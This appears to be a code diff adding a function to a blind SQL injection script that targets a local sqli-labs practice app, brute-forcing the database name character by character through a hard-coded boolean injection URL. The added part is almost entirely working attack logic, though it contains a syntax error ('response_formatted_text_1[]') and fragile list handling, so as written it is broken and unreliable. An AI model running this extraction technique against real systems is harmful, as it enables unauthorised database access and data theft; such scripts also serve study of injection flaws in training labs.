@@ -55,4 +55,47 @@ def username_length_finder(payload, validator):
 
 
 
+def database_name_finder(payload, validator):
+    i = 0
+    a = 32
+    ascii_max = 127
+    list_payload_1 = list(payload)
+    database_name_list = []
+    payload_database_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(database())) = 1 --+"
+
+    database_name_length = database_name_length_finder(payload_database_length, validator)
+    print(database_name_length)
+
+    while (i < database_name_length):
+        i = i + 1
+        list_payload_2 = list_payload_1
+        list_payload_2[91] = str(i)
+
+        while (a < ascii_max):
+            if (a == 32):
+                list_payload_2[100] = str(a)
+                payload_1 = "".join(list_payload_2)
+
+                print(payload_1)
+                response_text_1 = get_requester(payload_1)
+                response_formatted_text_1 = text_formatter(response_text_1)
+            else:
+                print(payload_1)
+                response_text_1 = get_requester(payload_1)
+                response_formatted_text_1 = text_formatter(response_text_1)
+
+            if (validator == response_formatted_text_1[]):
+                database_name_list.append(chr(a))
+                a = 32
+                break
+            else:
+                a = a + 1
+                list_payload_2[100] = str(a)
+                payload_1 = "".join(list_payload_2)
+
+    database_name = "".join(database_name_list)
+
+    return database_name
+
+
     
